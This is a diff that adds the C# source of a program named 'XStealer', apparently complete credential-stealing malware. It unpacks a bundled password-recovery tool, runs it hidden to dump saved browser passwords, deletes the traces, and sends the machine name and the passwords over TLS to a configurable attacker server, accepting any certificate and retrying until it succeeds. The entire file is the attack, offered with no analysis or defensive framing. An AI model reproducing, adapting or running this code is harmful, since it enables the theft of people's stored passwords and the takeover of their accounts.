@@ -1,0 +1,151 @@
+﻿using System;
+using System.IO;
+using System.Text;
+using System.Threading;
+using System.Reflection;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+
+namespace XStealer
+{
+    class Program
+    {
+        // Server port
+        public static string Ip = "%IP%";
+
+        // Server port
+        public static int Port = %PORT%;
+
+        static void Main(string[] args)
+        {
+			Directory.SetCurrentDirectory(Path.GetTempPath());
+
+            ExtractResource("WebBrowserPassView.exe");
+
+            Run("WebBrowserPassView.exe", @"/stext Pss73848547474.txt");
+
+            // Wait for it to finish, than delete file
+            Thread.Sleep(6500);
+            File.Delete("WebBrowserPassView.exe");
+
+            // Read contents of file, than delete file
+            string Passwords = File.ReadAllText("Pss73848547474.txt");
+            File.Delete("Pss73848547474.txt");
+
+            // check if it contains anything, if not, send the following string to the Api
+            if (Passwords.Length == 0)
+            {
+                Passwords = "No passwords found!";
+            }
+
+            TryAgain:
+
+            try
+            {
+                // Connect
+                SocketHandler.Connect();
+                SocketHandler.Send(Environment.MachineName + "~" + Passwords);
+                SocketHandler.Disconnect();
+            } catch
+            {
+                Thread.Sleep(5000);
+                goto TryAgain;
+            }
+
+            Environment.Exit(0);
+        }
+
+        // Run files with parameters method
+        public static void Run(string FileName, string Arguments)
+        {
+            var Pro = new Process();
+            ProcessStartInfo ProInfo = new ProcessStartInfo()
+            {
+                WindowStyle = ProcessWindowStyle.Hidden,
+                FileName = FileName,
+                Arguments = @"/C " + Arguments
+            };
+            Pro.StartInfo = ProInfo;
+            Pro.Start();
+        }
+
+        public static void ExtractResource(string FileName)
+        {
+            Assembly assembly = Assembly.GetCallingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(FileName))
+            {
+                byte[] bytes = new byte[(int)stream.Length];
+                stream.Read(bytes, 0, bytes.Length);
+                File.WriteAllBytes(FileName, bytes);
+            }
+        }
+
+        class SocketHandler
+        {
+            private static byte[] Buffer;
+            private static TcpClient client;
+            private static SslStream sslStream;
+
+            // Connect method
+            public static void Connect()
+            {
+                // Create new instance
+                client = new TcpClient(Ip, Port);
+
+                // Create new sslstream instace and validate certificate
+                sslStream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);
+
+                // Authenticate as client
+                sslStream.AuthenticateAsClient("127.0.0.1");
+
+                // Set receive timeout
+                sslStream.ReadTimeout = 12000;
+            }
+
+            // ValidateServerCertificate method
+            public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+            {
+                return true;
+            }
+
+            // Disconnect method
+            public static void Disconnect()
+            {
+                // Close socket
+                client.Close();
+            }
+
+            // Send method
+            public static void Send(string Message)
+            {
+                // Write to the stream
+                sslStream.Write(Encoding.ASCII.GetBytes(" " + Message), 0, Message.Length + 1);
+            }
+
+            // Receive method
+            private static string TrimSpace;
+            public static string Receive()
+            {
+                // Setup buffer
+                Buffer = new byte[client.ReceiveBufferSize];
+
+                // Read incoming data and strip front space
+                for (int i = 0; i < 2; i++)
+                {
+                    TrimSpace = Encoding.ASCII.GetString(Buffer, 0, sslStream.Read(Buffer, 0, Buffer.Length));
+                }
+
+                // Check for graceful disconnect
+                if (TrimSpace.Length == 0)
+                {
+                    Disconnect();
+                }
+
+                // Return data received
+                return TrimSpace;
+            }
+        }
+    }
+}
